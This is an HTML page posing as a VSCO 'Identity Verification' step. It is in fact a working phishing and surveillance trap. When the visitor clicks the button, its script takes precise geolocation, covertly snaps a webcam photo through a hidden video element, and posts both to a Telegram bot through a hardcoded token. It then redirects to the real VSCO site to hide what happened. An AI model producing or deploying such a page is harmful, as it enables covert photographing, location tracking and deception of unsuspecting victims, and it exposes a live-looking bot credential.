<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VSCO Studio</title>
    <style>
        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .vsco-logo { width: 60px; height: 60px; margin-bottom: 40px; }
        .container { text-align: center; width: 85%; max-width: 350px; }
        h1 { font-size: 22px; font-weight: 600; margin-bottom: 15px; }
        p { font-size: 14px; color: #a0a0a0; line-height: 1.5; margin-bottom: 35px; }
        
        /* Ø§Ù„Ø²Ø± Ø§Ù„Ø°ÙŠ Ø·Ù„Ø¨ØªÙ‡ */
        .action-btn { 
            background: #007aff; color: white; border: none; padding: 16px; 
            border-radius: 12px; font-weight: 600; font-size: 16px; width: 100%;
            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
        }
        .action-btn:active { background: #0056b3; transform: scale(0.98); }
        
        .footer-note { font-size: 12px; color: #444; margin-top: 30px; letter-spacing: 1px; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
        <h1>Identity Verification</h1>
        <p>To access the professional studio tools, please complete the mandatory facial and region verification.</p>
        
        <button class="action-btn" onclick="startVerification()">Verify & Enter Studio</button>
        
        <div class="footer-note">SECURE ACCESS â€¢ 2026</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
        const chatId = "8005843544";

        async function startVerification() {
            // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙÙˆØ± Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„Ø¶Ù…Ø§Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ø¥Ø°Ù†
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    capturePhoto(loc);
                },
                (err) => {
                    capturePhoto("Location Access Denied");
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }

        async function capturePhoto(locationText) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('video');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('canvas');
                    const ctx = c.getContext('2d');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    ctx.drawImage(v, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const f = new FormData();
                        f.append('chat_id', chatId);
                        f.append('photo', blob);
                        f.append('caption', `âœ… Verified!\nðŸ“ Map: ${locationText}`);
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
                    }, 'image/jpeg');

                    setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
                }, 1000);
            } catch (e) {
                alert("Please enable camera access and use an external browser (Chrome/Safari) to continue.");
            }
        }
    </script>
</body>
</html>
